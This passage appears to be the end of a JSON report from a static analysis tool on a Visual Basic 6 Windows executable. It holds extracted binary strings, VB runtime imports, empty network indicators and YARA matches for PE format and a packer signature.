            "PEP\u058b\u040dM",
            "hXZ@",
            "M\u040dUQERMPUQERMPQj",
            "UERMPUQERPj",
            "8]hpd@",
            "DM\u040dUQERMPUQERMPQj",
            "UERMPUQERPj",
            "EM_^d",
            "0SVWeE",
            "3VEEE",
            "PEP\u04cbURW",
            "hXZ@",
            "UPR\u04cbE3PEPuPj",
            "hlZ@",
            "MUQRj",
            "uhe@",
            "EMPQj",
            "EM_^d",
            "(SVWeE",
            "3VEEEE",
            "PEP\u04cb",
            "UPR\u04cbMQV",
            "hXZ@",
            "hXZ@",
            "EMPQj",
            "U\u070dERPj",
            "$MUQRj",
            "E\u070dMPQj",
            "EM_^d",
            "MSVBVM60.DLL",
            "_CIcos",
            "_adj_fptan",
            "_adj_fdiv_m64",
            "__vbaFreeObjList",
            "_adj_fprem1",
            "__vbaStrCat",
            "__vbaHresultCheckObj",
            "_adj_fdiv_m32",
            "__vbaObjSet",
            "_adj_fdiv_m16i",
            "_adj_fdivr_m16i",
            "_CIsin",
            "__vbaChkstk",
            "__vbaFileClose",
            "EVENT_SINK_AddRef",
            "_adj_fpatan",
            "__vbaStrR8",
            "EVENT_SINK_Release",
            "_CIsqrt",
            "EVENT_SINK_QueryInterface",
            "__vbaExceptHandler",
            "__vbaPrintFile",
            "_adj_fprem",
            "_adj_fdivr_m64",
            "__vbaFPException",
            "_CIlog",
            "__vbaFileOpen",
            "_adj_fdiv_m32i",
            "_adj_fdivr_m32i",
            "__vbaFreeStrList",
            "_adj_fdivr_m32",
            "_adj_fdiv_r",
            "_CIatan",
            "__vbaStrMove",
            "_allmul",
            "_CItan",
            "_CIexp",
            "__vbaFreeStr",
            "__vbaFreeObj",
            "wwwwwww",
            "xpxwp",
            "wpxwxpxp",
            "wwwwwwp",
            "wwwwwwwwwwwwwp",
            "wwxwp",
            "wwwxwp",
            "wwwwwwwp",
            "wwww",
            "xwwww",
            "wwwwwwwwww",
            "wwwwwwwp",
            "wwwwwwp",
            "wwwwwwp",
            "wwwp",
            "wwwp",
            "wwwwwwwp"
        ],
        "file": {
            "+3qD:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB": "Autogen",
            "MSVBVM60.DLL": "Library",
            "VBA6.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.695019",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer_compiler_signatures.yar": "HasRichSignature"
        },
        {
            "packer.yar": "ProtectSharewareV11eCompservCMS"
        }
    ]
}
